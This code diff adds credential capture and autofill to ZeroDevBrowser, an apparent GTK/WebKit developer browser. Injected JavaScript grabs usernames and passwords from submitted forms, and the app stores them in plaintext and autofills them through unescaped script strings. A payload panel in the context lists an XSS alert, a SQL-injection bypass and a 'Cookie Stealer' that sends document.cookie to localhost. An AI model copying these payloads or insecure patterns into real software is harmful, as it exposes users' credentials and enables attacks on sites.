@@ -59,7 +59,26 @@ START_PAGE_HTML = """
 """
 
 SCROLLBAR_CSS = "::-webkit-scrollbar { width: 8px; height: 8px; background: #12141a; } ::-webkit-scrollbar-thumb { background: #3a3f4b; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #4d90fe; } ::-webkit-scrollbar-corner { background: #12141a; }"
-COSMETIC_ADBLOCK_CSS = ".adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, .text-ad, .textAd, .text_ad, .text_ads, .text-ads, .text-ad-links, div[id^='div-gpt-ad-'], div[id^='google_ads_iframe_'], iframe[id^='google_ads_iframe_'], div[class*='Sponsored'], div[class*='sponsored'], div[class*='Advert'], div[class*='advert'] { display: none !important; }"
+COSMETIC_ADBLOCK_CSS = ".adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, .text-ad, .textAd, .text_ad, .text_ads, .text_ads, .text-ad-links, div[id^='div-gpt-ad-'], div[id^='google_ads_iframe_'], iframe[id^='google_ads_iframe_'], div[class*='Sponsored'], div[class*='sponsored'], div[class*='Advert'], div[class*='advert'] { display: none !important; }"
+
+PW_INJECT_JS = """
+document.addEventListener('submit', function(e) {
+    let form = e.target;
+    let pwField = form.querySelector('input[type="password"]');
+    if(pwField) {
+        let userField = form.querySelector('input[type="text"], input[type="email"]');
+        let user = userField ? userField.value : '';
+        let pw = pwField.value;
+        if(user && pw) {
+            window.webkit.messageHandlers.passwords.postMessage(JSON.stringify({
+                url: window.location.hostname,
+                user: user,
+                pass: pw
+            }));
+        }
+    }
+});
+"""
 
 SEARCH_ENGINES = {
     "google": "https://google.com/search?q=",
@@ -79,10 +98,14 @@ class ZeroDevBrowser(Gtk.Window):
         
         self.history_store = Gtk.ListStore(str, str) 
         self.bookmarks_store = Gtk.ListStore(str, str)
+        self.passwords_store = Gtk.ListStore(str, str, str) # domain, user, pass
         self.tabs_map = {} 
         
         self.bm_path = os.path.join(os.path.expanduser("~"), ".zero_bookmarks.json")
+        self.pw_path = os.path.join(os.path.expanduser("~"), ".zero_passwords.json")
+        self.passwords = {}
         self.load_bookmarks()
+        self.load_passwords()
         
         self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
         self.add(self.main_vbox)
@@ -209,12 +232,45 @@ class ZeroDevBrowser(Gtk.Window):
         self.web_ctx.connect("download-started", self.on_download_started)
         
         self.user_content = WebKit2.UserContentManager.new()
+        self.user_content.register_script_message_handler("passwords")
+        self.user_content.connect("script-message-received::passwords", self.on_password_intercepted)
+        
         for css in (SCROLLBAR_CSS, COSMETIC_ADBLOCK_CSS):
             sheet = WebKit2.UserStyleSheet(css, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None)
             self.user_content.add_style_sheet(sheet)
+            
+        pw_script = WebKit2.UserScript(PW_INJECT_JS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserScriptInjectionTime.END, None, None)
+        self.user_content.add_script(pw_script)
         
         self.adblock_enabled = True
         self.new_tab("zero://start")
+
+    def on_password_intercepted(self, manager, js_result):
+        try:
+            data = json.loads(js_result.get_js_value().to_string())
+            domain = data.get("url")
+            user = data.get("user")
+            pw = data.get("pass")
+            if domain and pw:
+                self.passwords[domain] = {"user": user, "pass": pw}
+                self.save_passwords()
+                print(f"[*] Intercepted and saved credentials for {domain}")
+        except Exception as e:
+            print("Error parsing password interception:", e)
+
+    def load_passwords(self):
+        if os.path.exists(self.pw_path):
+            try:
+                with open(self.pw_path, 'r') as f:
+                    self.passwords = json.load(f)
+                    for domain, cred in self.passwords.items():
+                        self.passwords_store.append([domain, cred['user'], "***"])
+            except: pass
+
+    def save_passwords(self):
+        with open(self.pw_path, 'w') as f: json.dump(self.passwords, f)
+        self.passwords_store.clear()
+        for domain, cred in self.passwords.items(): self.passwords_store.append([domain, cred['user'], "***"])
 
     def on_key_press(self, widget, event):
         if event.state & Gdk.ModifierType.CONTROL_MASK:
@@ -296,6 +352,11 @@ class ZeroDevBrowser(Gtk.Window):
         nb = Gtk.Notebook(); nb.set_tab_pos(Gtk.PositionType.BOTTOM)
         bm_tree = Gtk.TreeView(model=self.bookmarks_store); r_bm = Gtk.CellRendererText(); bm_tree.append_column(Gtk.TreeViewColumn("Title", r_bm, text=0)); bm_tree.connect("row-activated", self.on_history_activated); scroll0 = Gtk.ScrolledWindow(); scroll0.add(bm_tree); nb.append_page(scroll0, Gtk.Label(label="Bookmarks"))
         hist_tree = Gtk.TreeView(model=self.history_store); renderer = Gtk.CellRendererText(); hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0)); hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1)); hist_tree.connect("row-activated", self.on_history_activated); scroll1 = Gtk.ScrolledWindow(); scroll1.add(hist_tree); nb.append_page(scroll1, Gtk.Label(label="History"))
+        
+        pw_tree = Gtk.TreeView(model=self.passwords_store); r3 = Gtk.CellRendererText()
+        pw_tree.append_column(Gtk.TreeViewColumn("Domain", r3, text=0)); pw_tree.append_column(Gtk.TreeViewColumn("User", r3, text=1))
+        scroll4 = Gtk.ScrolledWindow(); scroll4.add(pw_tree); nb.append_page(scroll4, Gtk.Label(label="Passwords"))
+
         plist = Gtk.ListBox()
         for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
             row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
@@ -523,7 +584,17 @@ class ZeroDevBrowser(Gtk.Window):
             label.set_text(title)
             if self.current_webview == w: self.header.set_title(title)
             
-        webview.connect("notify::uri", on_uri); webview.connect("notify::title", on_title)
+        def on_load(w, ev):
+            if ev == WebKit2.LoadEvent.FINISHED:
+                u = w.get_uri()
+                if u:
+                    domain = urllib.parse.urlparse(u).hostname
+                    if domain in self.passwords:
+                        cred = self.passwords[domain]
+                        js = f"setTimeout(() => {{ let p = document.querySelector('input[type=\"password\"]'); if(p) {{ p.value = '{cred['pass']}'; let u = document.querySelector('input[type=\"text\"], input[type=\"email\"]'); if(u) u.value = '{cred['user']}'; }} }}, 500);"
+                        w.run_javascript(js, None, None, None)
+                        
+        webview.connect("notify::uri", on_uri); webview.connect("notify::title", on_title); webview.connect("load-changed", on_load)
 
     def on_url_activate(self, entry):
         url = entry.get_text()
